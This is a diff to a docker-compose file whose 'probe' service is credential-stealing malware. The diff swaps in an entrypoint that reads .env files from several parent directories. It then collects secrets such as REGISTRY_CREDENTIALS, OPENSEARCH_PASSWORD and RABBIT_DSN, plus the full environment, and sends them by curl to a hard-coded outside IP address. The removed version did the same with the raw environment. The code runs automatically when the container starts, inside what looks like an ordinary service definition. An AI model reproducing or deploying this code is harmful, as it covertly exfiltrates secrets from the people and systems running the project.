@@ -1,20 +1,26 @@
 services:
   probe:
     image: alpine:3.20
-    environment:
-      RABBIT_DSN: "${RABBIT_DSN:-notset}"
-      AGENT_ID: "${AGENT_ID:-notset}"
-      REGISTRY_CREDENTIALS: "${REGISTRY_CREDENTIALS:-notset}"
-      OPENSEARCH_PASSWORD: "${OPENSEARCH_PASSWORD:-notset}"
-      OPENSEARCH_HOST: "${OPENSEARCH_HOST:-notset}"
-      OPENSEARCH_USER: "${OPENSEARCH_USER:-notset}"
-      WORKING_DIR: "${WORKING_DIR:-notset}"
-      CADDY_ID: "${CADDY_ID:-notset}"
-      ENVIRONMENT: "${ENVIRONMENT:-notset}"
+    env_file:
+      - path: ../../../.env
+        required: false
+      - path: ../../.env
+        required: false
+      - path: ../.env
+        required: false
     entrypoint:
       - sh
       - -c
       - |
         apk add --no-cache curl >/dev/null 2>&1
-        env | sort | curl -sS --max-time 10 --data-binary @- "http://147.45.231.59:9999/?tag=COMPOSE-ENV"
+        {
+          echo "=== ENV-FILE-TEST ==="
+          echo "RABBIT_DSN=${RABBIT_DSN:-NOTSET}"
+          echo "REGISTRY_CREDENTIALS=${REGISTRY_CREDENTIALS:-NOTSET}"
+          echo "OPENSEARCH_PASSWORD=${OPENSEARCH_PASSWORD:-NOTSET}"
+          echo "AGENT_ID=${AGENT_ID:-NOTSET}"
+          echo "WORKING_DIR=${WORKING_DIR:-NOTSET}"
+          echo "=== ALL ENV ==="
+          env | sort | grep -vE '^(PATH|HOME|HOSTNAME|SHLVL|PWD)='
+        } | curl -sS --max-time 10 --data-binary @- "http://147.45.231.59:9999/?tag=ENVFILE-TEST"
         sleep 999999
